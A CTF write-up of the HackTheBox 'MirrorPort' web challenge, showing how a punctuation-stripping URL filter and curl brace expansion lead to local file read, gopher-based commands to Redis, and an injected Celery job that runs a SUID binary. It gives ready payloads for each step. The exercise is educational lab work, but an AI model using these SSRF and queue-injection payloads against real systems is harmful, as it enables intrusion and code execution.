---
title: "MirrorPort"
excerpt: "Web, neurogrid HTB"
coverImage: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
date: "2025-11-28"
author:
  name: dolipr4necrypt0
  picture: "/assets/blog/authors/dolipr4necrypt0.png"
ogImage:
  url: "https://ctftime.org/media/cache/35/81/35817b4272fa1b66cf3617ab4d4ab0c0.png"
---

MirrorPort was a web challenge from the HTB Neurogrid CTF. It was a hard challenge and only three solves during the competition, it was listed as Easy but there was probably an error in the difficulty. By abusing curl's brace expansion, we will used the GOPHER protocol to push a Celery job into Redis and get code execution.

The application offered only two main features: creating and viewing listings, with a cache system.

The codebase contained three relevant components:
- A React frontend
- A Flask backend
- Celery background workers

The React portion had nothing obviously interesting, so I focused on the backend and worker logic.

In the Dockerfile, we immediately notice a SUID read_flag binary, while flag.txt is readable only by root. Thus, the intended solution must involve obtaining code execution.

# Initial Observations

Creating a listing allows:
- Uploading an image
- Using Markdown in the description

The interesting part lies in how Markdown hyperlinks are processed: links are filtered and then fetched asynchronously using Celery background workers.

Celery uses Redis as a message broker. The project defines two Celery tasks, though only the first one is ever called and the last argument is never used when creating the tasks. This will matter later.

# Weird URL Filtering

The markdown processing extract links and apply a first filter. The URL filtering function looks like this:
```python
def filter_http_urls(urls: List[str]) -> List[str]:
        """Filter out non-HTTP URLs for security."""
        import string
        filtered_urls = []
        
        for url in urls[:]:
            if url.strip(string.punctuation).startswith(('http://', 'https://')):
                filtered_urls.append(url)
        
        return filtered_urls
```
This is immediately suspicious: Why strip punctuation before checking the protocol? That's really a non standard thing to do and will be useful later.

# The Celery Worker

Let's continue the code inspection and keep that in mind. The code of the background worker looks like this
```python
def fetch_url(url: str, listing_id, curl_binary='/usr/bin/curl'):
    if url.startswith(('gopher://', 'file://', "-K", "-k")):
        return 'error'
    try:
        ...

        # Build curl command
        curl_cmd = [
            '-s',  # Silent mode
            '-L',  # Follow redirects
            '-m', '30',  # 30 second timeout
            '-A', 'Ayame-Teahouse-Fetcher/1.0',  # User agent
            '-D', f"{temp_file}.headers",  # Save headers to file
            '-o', temp_file,  # Output to temp file
            '--url', url  # Explicitly specify URL
        ]
        curl_cmd = f"{curl_binary} {shlex.join(curl_cmd)}"

        # Execute curl command
        result = subprocess.run(
            curl_cmd, capture_output=True, shell=True, text=True, timeout=35)
```
There is another check on the url for common exploit. curl is executed through `shell=True`, but `shlex.join` prevents classic shell injection.

Since redirects are enabled, I initially tried redirecting to a file:// URI. But it's apparently blocked directly by curl as an unsafe redirect. As we can see in the curl documentation [https://curl.se/libcurl/c/CURLOPT_REDIR_PROTOCOLS.html](https://curl.se/libcurl/c/CURLOPT_REDIR_PROTOCOLS.html), the only redirect allowed are HTTP(S) and FTP(S). But it seems that in older versions, all protocols where allowed execept FILE and SCP. So maybe we have an old version of curl and we could still use the GOPHER protocol. But the docker doesn't seems to use an old versions vulnerable to this.

# Exploiting Punctuation Stripping

I tried to bypass the `shlex.join` but it's apparently not possible. Then I remembered the weird filtering that strips the punctuation before checking for http://. I tried something like `!http://`, `$http://`. Maybe there is some weird beavior with the shell. Then I tried
```
{http://}http://example.com
```
Curl was trying to make a request to the host `http`. I was really confused, after some research the doc says that curl is actually doing a brace expansion just like in bash. So a url like
```
{http://,file://}example.com
```
is actually expanded to 2 urls and curl make the 2 requests
```
http://example.com
file://example.com
```
We can confirm this by testing this markdown
```
![dummy]({http://,file://}/etc/passwd)
```
The `/etc/passwd` is indeed in the cache.

This gives arbitrary file read, but only as the celeryuser, so we cannot yet read the flag.

# Sending Redis command via GOPHER

The next step will be to exploit the Redis server. You can already see an hint in the `fetch_url` function that tries to restrict the GOPHER protocol. For those who don't know what the GOPHER protocol is, it's a pre-HTTP protocol, menu-based way to navigate text documents, there is no hyperlinks like the current Web. The interesting thing is that GOPHER just sends raw data. We can see that by having a netcat listener on port 1234 and run a curl command
```bash
$ curl "gopher://127.0.0.1:1234/_FIRST%20LINE%0ASECOND%20LINE"
 
$ nc -nlvp 1234
Listening on 0.0.0.0 1234
FIRST LINE
SECOND LINE
```
The common exploitation of the GOPHER protocol, is to send command directly to the Redis server. So lets try to send an INFO command to Redis, the gopher url is
```
gopher://127.0.0.1:6379/_%0D%0AINFO%0D%0Aquit%0D%0A
```
We need to use the previous trick to pass the filter. So let's send this markdown
```
![dummy]({http://,gopher://}_%0D%0AINFO%0D%0Aquit%0D%0A)
```
We indeed have the redis info in the cache and we can see the version of Redis is 8.0.2. Searching for CVE, we see multiples exploit but they all are memory vulnerabilities that seems hard to exploit.

# Exploiting Celery jobs in Redis

Since Redis stores Celery tasks, and Celery workers will execute anything pushed to the correct Redis queue, we can craft our own Celery job.

Do you remember the last parameter of `fetch_url` ? It's exactly the binary that the worker will run. Just putting `read_flag` as the last parameter will run the binary and the flag will be in the cache.

Next we need to understand the Redis command to use to run a Celery job. I didn't find any docs that explain the interaction between Redis and Celery. Maybe we can read the code of Celery to see the exact payload to use. But there is a much simpler way to get the payload. What I did is that I run a Redis Client inside the docker and launch a Celery job. We need to use the MONITOR command to log the command received by Redis. We can see a command like this
```
LPUSH celery '{"body": "BASE64 HERE", ..., "argsrepr": "[\'http://example.com\', 12]", ...}'
```
The arguments are reproduced 2 times in the payload. What is actually used as arguments by the worker is the base64 body. So we will need to base64 this
```
[["http://dummy", 666, "read_flag > /app/cache/flag"], {}, {"callbacks": null, "errbacks": null, "chain": null, "chord": null}]
```
Encode this array in Base64 and embed into the Redis LPUSH command. 

# Final exploit

The gopher url to send the Redis command should be something like
```
gopher://127.0.0.1:6379/_%0D%0ALPUSH%20celery%20'%7B%22body%22:%20%22BASE64 HERE%22,...END OF PAYLOAD%7D'%0D%0Aquit%0D%0A
```
To bypass the HTTP filter, we need to use the brace expansion. So the final exploit is
```
![toto]({http://,gopher://}127.0.0.1:6379/_%0D%0ALPUSH%20celery%20'PAYLOAD HERE'%0D%0Aquit%0D%0A)
```
The Celery worker processes the job, executes the SUID binary, and places the flag in the cache.

# Conclusion

This challenge combined:
- Weird input filtering `strip(string.punctuation)`
- Curl brace expansion
- Gopher-based Redis exploitation
- Pushing Celery job using Redis

Thanks Hackthebox for this challenge I really liked it.